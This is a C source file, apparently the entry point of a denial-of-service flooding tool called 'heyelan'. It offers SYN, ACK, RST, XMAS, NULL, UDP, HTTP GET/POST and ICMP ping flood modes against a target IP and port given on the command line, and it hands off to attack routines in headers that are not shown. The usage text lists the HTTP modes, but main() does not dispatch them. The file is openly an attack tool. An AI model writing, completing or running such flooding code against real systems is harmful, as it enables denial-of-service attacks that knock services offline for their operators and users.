#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "tcp_attack.h"
#include "udp_attack.h"
#include "icmp_attack.h"
#include "http_attack.h"
#include "utils.h"
#include "types.h"

struct attack_map_t {
	char *name;
	int attack_id;
};


struct attack_map_t attack_map[] = {
	{"syn", ATTACK_TCP_SYN},
	{"ack", ATTACK_TCP_ACK},
	{"synack", ATTACK_TCP_SYNACK},
	{"pshack", ATTACK_TCP_PSHACK},
	{"ackfin", ATTACK_TCP_ACKFIN},
	{"rst", ATTACK_TCP_RST},
	{"xmas", ATTACK_TCP_XMAS},
	{"null", ATTACK_TCP_NULL},
	{"udp", ATTACK_UDP},
	{"get", ATTACK_HTTP_GET},
	{"post", ATTACK_HTTP_POST},
	{"ping", ATTACK_ICMP_PING},
	{NULL, 0}
};

struct target_data target;

void signal_exit()
{
	close(target.sockfd);
}

void heyelan_usage(char *argv[])
{
	fprintf(stdout,
		"\nusage: %s [attack type] [options]\n"
		"\nattack types:\n\n"
		"\tsyn    : SYN flood attack\n"
		"\tack    : ACK flood attack\n"
		"\tsynack : SYN-ACK flood attack\n"
		"\tpshack : PSH-ACK flood attack\n"
		"\tackfin : ACK-FIN flood attack\n"
		"\trst    : RST flood attack\n"
		"\txmas    : all flags flood attack\n"
		"\tnull   : no flags flood attack\n"
		"\tudp    : UDP flood attack\n"
		"\tget    : HTTP GET flood attack\n"
		"\tpost   : HTTP POST flood attack\n"
		"\tping   : ICMP ping flood attack\n"
		"\noptions:\n\n"
		"\t-t [target IP address] : target IP address to attack\n"
		"\t-p [target port]       : target port to attack\n"
		"\t-h                     : help message\n\n", argv[0]);
	exit(EXIT_FAILURE);
}

void parse_args(int argc, char *argv[])
{
	int opt;

	if (argc < 3) {
		heyelan_usage(argv);
	}

	for (int i = 0; attack_map[i].name != NULL; i++) {
		if (!strncmp(argv[1], attack_map[i].name, strlen(attack_map[i].name)) &&
			strlen(argv[1]) == strlen(attack_map[i].name)) {
			target.attack_type = attack_map[i].attack_id;
			break;
		}
	}

	while ((opt = getopt(argc, argv, "t:p:h")) != -1) {
		switch (opt) {
		case 't':
			inet_pton(AF_INET, optarg, &target.target_addr);
			break;
		case 'p':
			target.target_port = atoi(optarg);
			break;
		case 'h':
			heyelan_usage(argv);
			break;
		case '?':
			break;
		}
	}
}

int main(int argc, char *argv[])
{
	memset(&target, 0, sizeof(struct target_data));
	target.attack_type = -1;

	parse_args(argc, argv);

	if (!target.target_addr) {
		fprintf(stdout, "target address not specified, aborting.\n");
		exit(EXIT_FAILURE);
	}

	init_signal(&signal_exit);

	if (target.attack_type >= ATTACK_TCP_SYN && target.attack_type <= ATTACK_TCP_NULL) {
		attack_tcp(&target);
	} else if (target.attack_type == ATTACK_UDP) {
		attack_udp(&target);
	} else if (target.attack_type == ATTACK_ICMP_PING) {
		attack_icmp(&target);
	} else {
		fprintf(stderr, "attack type not specified/attack type is wrong.\n");
	}

	return 0;
}
